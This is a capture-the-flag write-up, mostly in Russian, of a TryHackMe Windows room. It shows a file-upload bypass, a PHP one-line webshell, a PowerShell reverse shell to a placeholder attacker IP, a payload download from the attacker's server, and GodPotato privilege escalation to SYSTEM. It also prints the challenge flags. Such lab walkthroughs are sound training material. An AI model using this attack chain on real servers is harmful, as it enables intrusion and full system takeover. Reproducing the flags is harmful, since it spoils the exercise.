# TryHackMe — Host Evasion (PowerShell Script Analyser)

**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Windows Server 2019  
**Tags:** File Upload Bypass, PHP WebShell, PowerShell RCE, SeImpersonatePrivilege, GodPotato

---

## Recon

### Nmap

```
PORT     STATE SERVICE
8080/tcp open  http
```

Server header: `Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28` — XAMPP на Windows.

### Gobuster

```
/index.php   (Status: 200)
/uploads     (Status: 301)
```

Найдена директория `/uploads` — значит загруженные файлы сохраняются на сервер.

---

## Exploitation

### File Upload Bypass

Целевое приложение — **PowerShell Script Analyser**: принимает `.ps1` файлы, "анализирует" их и возвращает Output.

Фильтрация на стороне сервера блокирует всё кроме `.ps1`. Через **Burp Suite** перехватил запрос загрузки и изменил имя файла:

```
filename="shell.php.ps1"
```

Сервер проверяет только последнее расширение (`.ps1`) — файл прошёл фильтр.

### PowerShell RCE

Обнаружил что анализатор **выполняет** PowerShell код внутри загруженного файла. Использовал `Set-Content` для записи PHP веб-шелла в корень веб-сервера:

```powershell
$code = '<?php system($_GET["cmd"]); ?>'
Set-Content -Path "C:\xampp\htdocs\shell.php" -Value $code
```

Загрузил скрипт через форму — анализатор выполнил его. Веб-шелл появился по адресу:

```
http://<IP>:8080/shell.php?cmd=whoami
# Результат: hostevasion\evader
```

### Reverse Shell

Записал PowerShell реверс-шелл в htdocs через анализатор:

```powershell
$code = '$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",443);...'
Set-Content -Path "C:\xampp\htdocs\rev.ps1" -Value $code
```

Запустил через веб-шелл:

```
http://<IP>:8080/shell.php?cmd=powershell+-ExecutionPolicy+Bypass+-File+C:\xampp\htdocs\rev.ps1
```

Получил обратное соединение на `rlwrap nc -nvlp 443`.

---

## Privilege Escalation

### Enumeration

```powershell
whoami /priv
```

```
SeImpersonatePrivilege    Enabled
```

`SeImpersonatePrivilege` — классический вектор для Potato атак.

**OS:** Windows Server 2019 — JuicyPotato не работает.

### GodPotato

Загрузил GodPotato на целевую машину через HTTP сервер на атакующей машине:

```bash
# Атакующая машина
python3 -m http.server 8000
```

```
# Через веб-шелл
http://<IP>:8080/shell.php?cmd=powershell+-c+"Invoke-WebRequest+-Uri+'http://<ATTACKER_IP>:8000/GodPotato-NET4.exe'+-OutFile+'C:\xampp\htdocs\uploads\GodPotato.exe'"
```

Выполнил команду от имени SYSTEM:

```
http://<IP>:8080/shell.php?cmd=C:\xampp\htdocs\uploads\GodPotato.exe+-cmd+"cmd+/c+type+C:\Users\Administrator\Desktop\flag.txt"
```

```
[*] CurrentUser: NT AUTHORITY\SYSTEM
THM{101011_ADMIN_ACCESS}
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `THM{1010_EVASION_LOCAL_USER}` |
| Root | `THM{101011_ADMIN_ACCESS}` |

---

## Lessons Learned

1. **File upload фильтры** часто проверяют только расширение — двойное расширение (`shell.php.ps1`) обходит такую проверку
2. **Анализаторы кода** сами могут быть уязвимы если выполняют загруженный код
3. **`Set-Content`** в PowerShell позволяет записывать файлы в произвольные директории
4. **`SeImpersonatePrivilege`** на Windows Server 2019 — используй GodPotato (не JuicyPotato)
5. Для стабильного реверс-шелла на Windows используй `rlwrap nc`

---

## Tools Used

- Nmap
- Gobuster
- Burp Suite
- GodPotato
- Netcat / rlwrap
